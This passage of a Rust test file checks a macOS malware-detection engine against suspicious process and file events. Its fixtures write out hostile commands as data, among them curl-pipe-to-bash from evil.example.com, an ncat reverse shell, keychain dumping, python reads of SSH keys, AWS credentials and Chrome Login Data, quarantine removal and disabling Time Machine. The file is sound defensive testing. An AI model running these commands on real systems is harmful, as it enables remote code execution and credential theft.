            command_path_kind: classify_path(command),
            parent_command: None,
            parent_args: None,
            parent_process_kind: None,
            parent_command_path_kind: None,
            behavior: extract_features(command, args),
        }
    }

    // ── detect_burst_file_activity ─────────────────────────────────────────────

    #[test]
    fn burst_file_activity_fires_at_threshold() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        let dir = format!("{}/Downloads", std::env::var("HOME").unwrap_or_default());
        for i in 0..25 {
            ctx.recent_file_events.push(make_file_event(
                "file_created",
                &format!("{dir}/file{i}.txt"),
                false,
                false,
                0, // all within the last second
            ));
        }
        let events = evaluate_detections(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_burst_file_activity"),
            "should fire for 25 events"
        );
    }

    #[test]
    fn burst_file_activity_does_not_fire_below_threshold() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        let dir = format!("{}/Downloads", std::env::var("HOME").unwrap_or_default());
        for i in 0..24 {
            ctx.recent_file_events.push(make_file_event(
                "file_created",
                &format!("{dir}/file{i}.txt"),
                false,
                false,
                0,
            ));
        }
        let events = evaluate_detections(&ctx);
        assert!(
            !events.iter().any(|e| e.event_type == "alert_burst_file_activity"),
            "should not fire for 24 events"
        );
    }

    #[test]
    fn burst_file_activity_does_not_fire_for_old_events() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        let dir = format!("{}/Downloads", std::env::var("HOME").unwrap_or_default());
        for i in 0..30 {
            ctx.recent_file_events.push(make_file_event(
                "file_created",
                &format!("{dir}/file{i}.txt"),
                false,
                false,
                60, // 60 seconds old — outside the 15s window
            ));
        }
        let events = evaluate_detections(&ctx);
        assert!(
            !events.iter().any(|e| e.event_type == "alert_burst_file_activity"),
            "should not fire for events outside the 15s window"
        );
    }

    // ── detect_file_became_executable ─────────────────────────────────────────

    #[test]
    fn file_became_executable_fires_for_downloads() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        let home = std::env::var("HOME").unwrap_or_default();
        ctx.recent_file_events.push(make_file_event(
            "file_became_executable",
            &format!("{home}/Downloads/payload.sh"),
            true,
            false,
            0,
        ));
        let events = evaluate_detections(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_file_became_executable"),
            "should fire when a Downloads file becomes executable"
        );
    }

    #[test]
    fn file_became_executable_does_not_fire_for_wrong_kind() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        let home = std::env::var("HOME").unwrap_or_default();
        ctx.recent_file_events.push(make_file_event(
            "file_created", // not file_became_executable
            &format!("{home}/Downloads/payload.sh"),
            true,
            false,
            0,
        ));
        let events = evaluate_detections(&ctx);
        assert!(
            !events.iter().any(|e| e.event_type == "alert_file_became_executable"),
            "should not fire for file_created events"
        );
    }

    // ── detect_persistence_artifact_touched ───────────────────────────────────

    #[test]
    fn persistence_artifact_fires_for_launch_agents() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        let home = std::env::var("HOME").unwrap_or_default();
        ctx.recent_file_events.push(make_file_event(
            "file_created",
            &format!("{home}/Library/LaunchAgents/com.evil.backdoor.plist"),
            false,
            false,
            0,
        ));
        let events = evaluate_detections(&ctx);
        assert!(
            events
                .iter()
                .any(|e| e.event_type == "alert_persistence_artifact_touched"),
            "should fire for new LaunchAgent plist"
        );
    }

    #[test]
    fn persistence_artifact_does_not_fire_for_downloads_file() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        let home = std::env::var("HOME").unwrap_or_default();
        ctx.recent_file_events.push(make_file_event(
            "file_created",
            &format!("{home}/Downloads/invoice.pdf"),
            false,
            false,
            0,
        ));
        let events = evaluate_detections(&ctx);
        assert!(
            !events
                .iter()
                .any(|e| e.event_type == "alert_persistence_artifact_touched"),
            "should not fire for a normal Downloads file"
        );
    }

    // ── detect_quarantined_file_activity ──────────────────────────────────────

    #[test]
    fn quarantined_file_activity_fires_for_high_signal_download() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        let home = std::env::var("HOME").unwrap_or_default();
        ctx.recent_file_events.push(make_file_event(
            "file_created",
            &format!("{home}/Downloads/malware.sh"),
            false,
            true, // has quarantine
            0,
        ));
        let events = evaluate_detections(&ctx);
        assert!(
            events
                .iter()
                .any(|e| e.event_type == "alert_quarantined_file_activity"),
            "should fire for quarantined .sh in Downloads"
        );
    }

    #[test]
    fn quarantined_file_activity_does_not_fire_for_non_quarantined_file() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        let home = std::env::var("HOME").unwrap_or_default();
        ctx.recent_file_events.push(make_file_event(
            "file_created",
            &format!("{home}/Downloads/doc.pdf"),
            false,
            false, // no quarantine
            0,
        ));
        let events = evaluate_detections(&ctx);
        assert!(
            !events
                .iter()
                .any(|e| e.event_type == "alert_quarantined_file_activity"),
            "should not fire for non-quarantined file"
        );
    }

    // ── detect_downloaded_file_executed ───────────────────────────────────────

    #[test]
    fn downloaded_file_executed_fires_when_process_references_download() {
        let now = Utc::now();
        let home = std::env::var("HOME").unwrap_or_default();
        let script_path = format!("{home}/Downloads/payload.sh");
        let mut ctx = empty_ctx(now);
        ctx.recent_file_events.push(make_file_event(
            "file_created",
            &script_path,
            false,
            false,
            10,
        ));
        ctx.recent_processes.push(make_process(
            1234,
            1,
            "bash",
            &script_path,
            "interpreter",
        ));
        let events = evaluate_detections(&ctx);
        assert!(
            events
                .iter()
                .any(|e| e.event_type == "alert_downloaded_file_executed"
                    || e.event_type == "alert_interpreter_launch_from_downloads"),
            "should fire when bash executes a recently downloaded script"
        );
    }

    #[test]
    fn downloaded_file_executed_does_not_fire_when_process_unrelated_to_download() {
        // A file appears in Downloads, but the only running process is `cargo build`
        // with no reference to that Downloads file. No connection → no alert.
        let now = Utc::now();
        let home = std::env::var("HOME").unwrap_or_default();
        let script_path = format!("{home}/Downloads/payload.sh");
        let mut ctx = empty_ctx(now);
        ctx.recent_file_events.push(make_file_event(
            "file_created",
            &script_path,
            false,
            false,
            10,
        ));
        ctx.recent_processes.push(make_process(
            1234,
            1,
            "cargo",
            "build --release",
            "interpreter",
        ));
        let events = evaluate_detections(&ctx);
        assert!(
            !events
                .iter()
                .any(|e| e.event_type == "alert_downloaded_file_executed"),
            "should not fire when the process does not reference the downloaded file"
        );
    }

    // ── detect_command_pattern_abuse ──────────────────────────────────────────

    #[test]
    fn command_pattern_abuse_fires_for_curl_pipe_bash() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        // curl https://example.com | bash — highest severity pattern
        ctx.recent_processes.push(make_process(
            2000,
            1,
            "curl",
            "https://evil.example.com | bash",
            "interpreter",
        ));
        let events = evaluate_detections(&ctx);
        assert!(
            events
                .iter()
                .any(|e| e.event_type == "alert_command_pattern_abuse"),
            "should fire for curl|bash pattern"
        );
    }

    #[test]
    fn command_pattern_abuse_does_not_fire_for_benign_npm() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        // npm install runs node which may look like interpreter activity
        ctx.recent_processes.push(make_process(
            2001,
            1,
            "npm",
            "install",
            "interpreter",
        ));
        let events = evaluate_detections(&ctx);
        assert!(
            !events
                .iter()
                .any(|e| e.event_type == "alert_command_pattern_abuse"),
            "should not fire for npm install"
        );
    }

    // ── detect_process_masquerading ───────────────────────────────────────────

    #[test]
    fn masquerading_fires_for_bash_in_downloads() {
        let now = Utc::now();
        let home = std::env::var("HOME").unwrap_or_default();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            3000,
            1,
            &format!("{home}/Downloads/bash"), // bash name but from Downloads
            "",
            "interpreter",
        ));
        let events = evaluate_detections(&ctx);
        assert!(
            events
                .iter()
                .any(|e| e.event_type == "alert_process_masquerading"),
            "should fire when 'bash' runs from Downloads"
        );
    }

    #[test]
    fn masquerading_does_not_fire_for_legitimate_system_bash() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            3001,
            1,
            "/bin/bash",
            "--login",
            "interpreter",
        ));
        let events = evaluate_detections(&ctx);
        assert!(
            !events
                .iter()
                .any(|e| e.event_type == "alert_process_masquerading"),
            "should not fire for /bin/bash"
        );
    }

    #[test]
    fn masquerading_does_not_fire_for_relative_path() {
        // ps may report just "bash" without a path; without a full path we cannot
        // confirm masquerading, so we should not fire
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            3002,
            1,
            "bash",
            "--noprofile",
            "interpreter",
        ));
        let events = evaluate_detections(&ctx);
        assert!(
            !events
                .iter()
                .any(|e| e.event_type == "alert_process_masquerading"),
            "should not fire for bare command name without full path"
        );
    }

    // ── detect_double_extension_execution ─────────────────────────────────────

    #[test]
    fn double_extension_fires_for_pdf_sh() {
        let now = Utc::now();
        let home = std::env::var("HOME").unwrap_or_default();
        let mut ctx = empty_ctx(now);
        ctx.recent_file_events.push(make_file_event(
            "file_created",
            &format!("{home}/Downloads/invoice.pdf.sh"),
            false,
            false,
            0,
        ));
        let events = evaluate_detections(&ctx);
        assert!(
            events
                .iter()
                .any(|e| e.event_type == "alert_double_extension_execution"),
            "should fire for invoice.pdf.sh"
        );
    }

    #[test]
    fn double_extension_fires_for_jpg_app() {
        let now = Utc::now();
        let home = std::env::var("HOME").unwrap_or_default();
        let mut ctx = empty_ctx(now);
        ctx.recent_file_events.push(make_file_event(
            "file_created",
            &format!("{home}/Downloads/photo.jpg.app"),
            false,
            false,
            0,
        ));
        let events = evaluate_detections(&ctx);
        assert!(
            events
                .iter()
                .any(|e| e.event_type == "alert_double_extension_execution"),
            "should fire for photo.jpg.app"
        );
    }

    #[test]
    fn double_extension_does_not_fire_for_normal_file() {
        let now = Utc::now();
        let home = std::env::var("HOME").unwrap_or_default();
        let mut ctx = empty_ctx(now);
        ctx.recent_file_events.push(make_file_event(
            "file_created",
            &format!("{home}/Downloads/report.pdf"),
            false,
            false,
            0,
        ));
        let events = evaluate_detections(&ctx);
        assert!(
            !events
                .iter()
                .any(|e| e.event_type == "alert_double_extension_execution"),
            "should not fire for a normal .pdf file"
        );
    }

    #[test]
    fn double_extension_does_not_fire_for_tar_gz() {
        // .tar.gz is a legitimate double extension — .gz is not dangerous
        let now = Utc::now();
        let home = std::env::var("HOME").unwrap_or_default();
        let mut ctx = empty_ctx(now);
        ctx.recent_file_events.push(make_file_event(
            "file_created",
            &format!("{home}/Downloads/archive.tar.gz"),
            false,
            false,
            0,
        ));
        let events = evaluate_detections(&ctx);
        assert!(
            !events
                .iter()
                .any(|e| e.event_type == "alert_double_extension_execution"),
            "should not fire for .tar.gz"
        );
    }

    // ── has_double_extension helper ───────────────────────────────────────────

    #[test]
    fn has_double_extension_recognizes_known_patterns() {
        assert!(has_double_extension("invoice.pdf.sh"));
        assert!(has_double_extension("photo.jpg.app"));
        assert!(has_double_extension("document.docx.py"));
        assert!(has_double_extension("video.mp4.dmg"));
    }

    #[test]
    fn has_double_extension_rejects_normal_files() {
        assert!(!has_double_extension("document.pdf"));
        assert!(!has_double_extension("archive.tar.gz"));
        assert!(!has_double_extension("script.sh"));
        assert!(!has_double_extension("app.bundle.app")); // Not a decoy extension
    }

    // ── detect_lolbin_and_injection ───────────────────────────────────────────

    #[test]
    fn lolbin_curl_pipe_bash_fires_alert_curl_pipe_bash() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            1001, 0,
            "/usr/bin/curl",
            "https://evil.example.com/payload.sh | bash",
            "interpreter",
        ));
        let events = detect_lolbin_and_injection(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_curl_pipe_bash"),
            "curl|bash should produce alert_curl_pipe_bash"
        );
    }

    #[test]
    fn lolbin_xattr_quarantine_removal_fires_alert_lolbin_execution() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            1002, 0,
            "/usr/bin/xattr",
            "-d com.apple.quarantine /Users/dan/Downloads/payload.app",
            "user_app",
        ));
        let events = detect_lolbin_and_injection(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_lolbin_execution"),
            "xattr quarantine removal should produce alert_lolbin_execution"
        );
    }

    #[test]
    fn lolbin_ncat_reverse_shell_fires_alert_command_injection_pattern() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            1003, 0,
            "/usr/bin/ncat",
            "-e /bin/bash 10.10.10.1 4444",
            "interpreter",
        ));
        let events = detect_lolbin_and_injection(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_command_injection_pattern"),
            "ncat -e should produce alert_command_injection_pattern"
        );
    }

    #[test]
    fn lolbin_does_not_fire_for_plain_cargo_build() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            1004, 0,
            "/Users/dan/.cargo/bin/cargo",
            "build --release",
            "user_app",
        ));
        let events = detect_lolbin_and_injection(&ctx);
        assert!(
            events.is_empty(),
            "plain cargo build should not produce any lolbin alerts"
        );
    }

    #[test]
    fn lolbin_does_not_fire_for_plain_git_fetch() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            1005, 0,
            "/usr/bin/git",
            "fetch origin main",
            "user_app",
        ));
        let events = detect_lolbin_and_injection(&ctx);
        assert!(
            events.is_empty(),
            "plain git fetch should not produce any lolbin alerts"
        );
    }

    // ── detect_keychain_access_attempt ────────────────────────────────────────

    #[test]
    fn keychain_dump_fires_critical_alert() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            2001, 0,
            "/usr/bin/security",
            "dump-keychain -d",
            "user_app",
        ));
        let events = detect_keychain_access_attempt(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_keychain_access_attempt"),
            "dump-keychain should produce alert_keychain_access_attempt"
        );
        // dump-keychain is Critical
        let ev = events.iter().find(|e| e.event_type == "alert_keychain_access_attempt").unwrap();
        let score = ev.payload.get("score").and_then(|v| v.as_i64()).unwrap_or(0);
        assert_eq!(score, AlertSeverity::Critical.score() as i64, "dump-keychain should be Critical severity");
    }

    #[test]
    fn keychain_find_generic_password_fires_high_alert() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            2002, 0,
            "/usr/bin/security",
            "find-generic-password -s MyService -a myaccount -w",
            "user_app",
        ));
        let events = detect_keychain_access_attempt(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_keychain_access_attempt"),
            "find-generic-password should produce alert_keychain_access_attempt"
        );
    }

    #[test]
    fn keychain_does_not_fire_for_security_list() {
        // `security list-keychains` is benign — not in KEYCHAIN_SUBCOMMANDS
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            2003, 0,
            "/usr/bin/security",
            "list-keychains",
            "user_app",
        ));
        let events = detect_keychain_access_attempt(&ctx);
        assert!(
            events.is_empty(),
            "security list-keychains should not fire keychain alert"
        );
    }

    #[test]
    fn keychain_does_not_fire_for_system_process() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            2004, 0,
            "/usr/bin/security",
            "find-generic-password -s SystemService",
            "system",
        ));
        let events = detect_keychain_access_attempt(&ctx);
        assert!(
            events.is_empty(),
            "system process calling security should not fire alert"
        );
    }

    // ── detect_browser_credential_access ─────────────────────────────────────

    #[test]
    fn browser_cred_fires_for_non_browser_accessing_chrome_login_data() {
        let home = std::env::var("HOME").unwrap_or_default();
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            2010, 0,
            "/usr/bin/python3",
            &format!("-c \"open('{home}/Library/Application Support/Google/Chrome/Default/Login Data')\""),
            "interpreter",
        ));
        let events = detect_browser_credential_access(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_browser_credential_access"),
            "python accessing Chrome Login Data should produce alert_browser_credential_access"
        );
    }

    #[test]
    fn browser_cred_does_not_fire_for_browser_process() {
        let home = std::env::var("HOME").unwrap_or_default();
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            2011, 0,
            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
            &format!("--profile-directory=Default --user-data-dir={home}/Library/Application Support/Google/Chrome"),
            "browser",
        ));
        let events = detect_browser_credential_access(&ctx);
        assert!(
            events.is_empty(),
            "browser process accessing its own credential store should not fire"
        );
    }

    // ── detect_credential_file_access ─────────────────────────────────────────

    #[test]
    fn ssh_key_access_fires_for_unexpected_process() {
        let home = std::env::var("HOME").unwrap_or_default();
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            2020, 0,
            "/usr/bin/python3",
            &format!("-c \"open('{home}/.ssh/id_rsa').read()\""),
            "interpreter",
        ));
        let events = detect_credential_file_access(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_ssh_key_access"),
            "python reading id_rsa should produce alert_ssh_key_access"
        );
    }

    #[test]
    fn aws_credentials_access_fires_for_unexpected_process() {
        let home = std::env::var("HOME").unwrap_or_default();
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            2021, 0,
            "/usr/bin/python3",
            &format!("-c \"open('{home}/.aws/credentials').read()\""),
            "interpreter",
        ));
        let events = detect_credential_file_access(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_ssh_key_access"),
            "python reading .aws/credentials should produce alert_ssh_key_access"
        );
    }

    #[test]
    fn ssh_key_access_does_not_fire_for_ssh_client() {
        let home = std::env::var("HOME").unwrap_or_default();
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            2022, 0,
            "/usr/bin/ssh",
            &format!("-i {home}/.ssh/id_rsa user@remote.host"),
            "system",
        ));
        let events = detect_credential_file_access(&ctx);
        assert!(
            events.is_empty(),
            "ssh client accessing id_rsa should not fire"
        );
    }

    #[test]
    fn ssh_key_access_does_not_fire_for_git() {
        let home = std::env::var("HOME").unwrap_or_default();
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            2023, 0,
            "/usr/bin/git",
            &format!("-c core.sshCommand='ssh -i {home}/.ssh/id_rsa' push origin"),
            "user_app",
        ));
        let events = detect_credential_file_access(&ctx);
        assert!(
            events.is_empty(),
            "git using SSH key should not fire credential alert"
        );
    }

    // ── detect_ransomware_behavior ────────────────────────────────────────────

    #[test]
    fn ransomware_extension_wave_fires_at_threshold() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        let home = std::env::var("HOME").unwrap_or_default();
        // Add 9 files with .locked extension (above threshold of 8)
        for i in 0..9usize {
            ctx.recent_file_events.push(make_file_event(
                "file_modified",
                &format!("{home}/Documents/file{i}.locked"),
                false,
                false,
                0,
            ));
        }
        let events = detect_ransomware_behavior(&ctx);
        assert!(
            events.iter().any(|e| {
                e.event_type == "alert_ransomware_behavior_detected"
                    && e.payload.get("details")
                        .and_then(|d| d.get("sub_signal"))
                        .and_then(|v| v.as_str())
                        == Some("ransomware_extension_wave")
            }),
            "9 .locked files should trigger ransomware_extension_wave"
        );
    }

    #[test]
    fn ransomware_extension_wave_does_not_fire_below_threshold() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        let home = std::env::var("HOME").unwrap_or_default();
        // Only 5 files — below threshold of 8
        for i in 0..5usize {
            ctx.recent_file_events.push(make_file_event(
                "file_modified",
                &format!("{home}/Documents/file{i}.locked"),
                false,
                false,
                0,
            ));
        }
        let events = detect_ransomware_behavior(&ctx);
        assert!(
            !events.iter().any(|e| {
                e.payload.get("details")
                    .and_then(|d| d.get("sub_signal"))
                    .and_then(|v| v.as_str())
                    == Some("ransomware_extension_wave")
            }),
            "5 .locked files should not trigger extension wave"
        );
    }

    #[test]
    fn ransom_note_fires_for_readme_in_downloads() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        let home = std::env::var("HOME").unwrap_or_default();
        ctx.recent_file_events.push(make_file_event(
            "file_created",
            &format!("{home}/Downloads/README.txt"),
            false,
            false,
            0,
        ));
        let events = detect_ransomware_behavior(&ctx);
        assert!(
            events.iter().any(|e| {
                e.event_type == "alert_ransomware_behavior_detected"
                    && e.payload.get("details")
                        .and_then(|d| d.get("sub_signal"))
                        .and_then(|v| v.as_str())
                        == Some("ransom_note_created")
            }),
            "README.txt in Downloads should trigger ransom_note_created"
        );
    }

    #[test]
    fn ransom_note_does_not_fire_for_readme_in_tmp() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_file_events.push(make_file_event(
            "file_created",
            "/tmp/README.txt",
            false,
            false,
            0,
        ));
        let events = detect_ransomware_behavior(&ctx);
        assert!(
            !events.iter().any(|e| {
                e.payload.get("details")
                    .and_then(|d| d.get("sub_signal"))
                    .and_then(|v| v.as_str())
                    == Some("ransom_note_created")
            }),
            "README.txt in /tmp should not trigger ransom note alert"
        );
    }

    #[test]
    fn backup_tampering_fires_for_tmutil_disable() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            3001, 0,
            "/usr/bin/tmutil",
            "disable",
            "user_app",
        ));
        let events = detect_ransomware_behavior(&ctx);
        assert!(
            events.iter().any(|e| {
                e.event_type == "alert_ransomware_behavior_detected"
                    && e.payload.get("details")
                        .and_then(|d| d.get("sub_signal"))
                        .and_then(|v| v.as_str())
                        == Some("backup_tampering")
            }),
            "tmutil disable should trigger backup_tampering"
        );
    }

    #[test]
    fn backup_tampering_does_not_fire_for_tmutil_startbackup() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            3002, 0,
            "/usr/bin/tmutil",
            "startbackup",
            "user_app",
        ));
        let events = detect_ransomware_behavior(&ctx);
        assert!(
            !events.iter().any(|e| {
                e.payload.get("details")
                    .and_then(|d| d.get("sub_signal"))
                    .and_then(|v| v.as_str())
                    == Some("backup_tampering")
            }),
            "tmutil startbackup should not trigger backup tampering"
        );
    }

    #[test]
    fn mass_file_modification_fires_at_threshold() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        let home = std::env::var("HOME").unwrap_or_default();
        // 16 unique file_modified events
        for i in 0..16usize {
            ctx.recent_file_events.push(make_file_event(
                "file_modified",
                &format!("{home}/Documents/doc{i}.txt"),
                false,
                false,
                0,
            ));
        }
        let events = detect_ransomware_behavior(&ctx);
        assert!(
            events.iter().any(|e| {
                e.payload.get("details")
                    .and_then(|d| d.get("sub_signal"))
                    .and_then(|v| v.as_str())
                    == Some("mass_file_modification")
            }),
            "16 unique file_modified events should trigger mass_file_modification"
        );
    }

    #[test]
    fn mass_file_modification_does_not_fire_for_single_file_repeated() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        let home = std::env::var("HOME").unwrap_or_default();
        // Same file modified 20 times — not ransomware, just one busy file
        for _ in 0..20usize {
            ctx.recent_file_events.push(make_file_event(
                "file_modified",
                &format!("{home}/Documents/bigfile.txt"),
                false,
                false,
                0,
            ));
        }
        let events = detect_ransomware_behavior(&ctx);
        assert!(
            !events.iter().any(|e| {
                e.payload.get("details")
                    .and_then(|d| d.get("sub_signal"))
                    .and_then(|v| v.as_str())
                    == Some("mass_file_modification")
            }),
            "single file modified repeatedly should not trigger mass_file_modification"
        );
    }

    // ── detect_file_type_mismatch ─────────────────────────────────────────────

    #[test]
    fn file_type_mismatch_fires_for_macho_disguised_as_pdf() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_file_events.push(make_file_event_with_magic(
            "file_created",
            "/Users/dan/Downloads/document.pdf",
            Some("macho64"),
        ));
        let events = detect_file_type_mismatch(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_file_type_mismatch"),
            "Mach-O binary with .pdf extension should fire alert_file_type_mismatch"
        );
    }

    #[test]
    fn file_type_mismatch_fires_for_elf_disguised_as_jpg() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_file_events.push(make_file_event_with_magic(
            "file_created",
            "/Users/dan/Downloads/photo.jpg",
            Some("elf"),
        ));
        let events = detect_file_type_mismatch(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_file_type_mismatch"),
            "ELF binary with .jpg extension should fire alert_file_type_mismatch"
        );
    }

    #[test]
    fn file_type_mismatch_does_not_fire_for_real_pdf() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_file_events.push(make_file_event_with_magic(
            "file_created",
            "/Users/dan/Downloads/invoice.pdf",
            Some("pdf"),
        ));
        let events = detect_file_type_mismatch(&ctx);
        assert!(
            events.is_empty(),
            "Legitimate PDF should not fire file type mismatch"
        );
    }

    #[test]
    fn file_type_mismatch_does_not_fire_for_docx_which_is_zip() {
        // .docx is a ZIP-based format — macho/elf would be suspicious, zip is correct
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_file_events.push(make_file_event_with_magic(
            "file_created",
            "/Users/dan/Documents/report.docx",
            Some("zip"),
        ));
        let events = detect_file_type_mismatch(&ctx);
        assert!(
            events.is_empty(),
            ".docx with ZIP magic bytes should not fire (OOXML is ZIP-based)"
        );
    }

    #[test]
    fn file_type_mismatch_does_not_fire_when_magic_is_unknown() {
        // If we can't identify the magic bytes, don't alert
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_file_events.push(make_file_event_with_magic(
            "file_created",
            "/Users/dan/Downloads/file.pdf",
            None, // no recognized magic bytes
        ));
        let events = detect_file_type_mismatch(&ctx);
        assert!(
            events.is_empty(),
            "Unknown magic bytes should not fire mismatch alert"
        );
    }

    #[test]
    fn file_type_mismatch_fires_for_macho_with_no_extension_rule() {
        // A file with extension .log containing Mach-O bytes should be flagged
        // because EXECUTABLE_MAGIC_HINTS is always suspicious regardless of extension
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_file_events.push(make_file_event_with_magic(
            "file_created",
            "/Users/dan/Downloads/system.log",
            Some("macho_fat"),
        ));
        let events = detect_file_type_mismatch(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_file_type_mismatch"),
            "Mach-O fat binary with .log extension should fire mismatch alert"
        );
    }

    // ── detect_system_recon ────────────────────────────────────────────────────

    #[test]
    fn system_recon_fires_for_system_profiler_by_user_app() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            1001,
            1000,
            "/usr/sbin/system_profiler",
            "SPSoftwareDataType",
            "user_app",
        ));
        let events = detect_system_recon(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_system_recon_detected"),
            "system_profiler by user_app should fire system recon alert"
        );
    }

    #[test]
    fn system_recon_fires_for_sw_vers_by_interpreter() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            1002,
            900,
            "/usr/bin/sw_vers",
            "-productVersion",
            "interpreter",
        ));
        let events = detect_system_recon(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_system_recon_detected"),
            "sw_vers by interpreter should fire system recon alert"
        );
    }

    #[test]
    fn system_recon_does_not_fire_for_system_process() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            100,
            1,
            "/usr/sbin/system_profiler",
            "SPHardwareDataType",
            "system",
        ));
        let events = detect_system_recon(&ctx);
        assert!(
            events.is_empty(),
            "system_profiler run by a system process should not fire"
        );
    }

    #[test]
    fn system_recon_does_not_fire_for_unknown_command() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            1003,
            900,
            "/usr/local/bin/my_tool",
            "--help",
            "user_app",
        ));
        let events = detect_system_recon(&ctx);
        assert!(
            events.is_empty(),
            "an unrelated command should not fire system recon"
        );
    }

    // ── detect_network_recon ───────────────────────────────────────────────────

    #[test]
    fn network_recon_fires_for_ifconfig_by_interpreter() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            2001,
            900,
            "/sbin/ifconfig",
            "-a",
            "interpreter",
        ));
        let events = detect_network_recon(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_network_recon_detected"),
            "ifconfig by interpreter should fire network recon alert"
        );
    }

    #[test]
    fn network_recon_fires_for_netstat_by_user_app() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            2002,
            900,
            "/usr/sbin/netstat",
            "-an",
            "user_app",
        ));
        let events = detect_network_recon(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_network_recon_detected"),
            "netstat by user_app should fire network recon alert"
        );
    }

    #[test]
    fn network_recon_does_not_fire_for_system_process() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            200,
            1,
            "/sbin/ifconfig",
            "en0",
            "system",
        ));
        let events = detect_network_recon(&ctx);
        assert!(
            events.is_empty(),
            "ifconfig by system process should not fire"
        );
    }

    #[test]
    fn network_recon_does_not_fire_for_browser_process() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            2003,
            1,
            "/sbin/netstat",
            "-an",
            "browser",
        ));
        let events = detect_network_recon(&ctx);
        assert!(
            events.is_empty(),
            "netstat from browser process kind should not fire (only interpreter/user_app/unknown)"
        );
    }

    // ── detect_filesystem_recon ────────────────────────────────────────────────

    #[test]
    fn filesystem_recon_fires_for_three_find_invocations() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            3001,
            900,
            "/usr/bin/find",
            "/Users/victim/Documents -name '*.key'",
            "interpreter",
        ));
        ctx.recent_processes.push(make_process(
            3002,
            900,
            "/usr/bin/find",
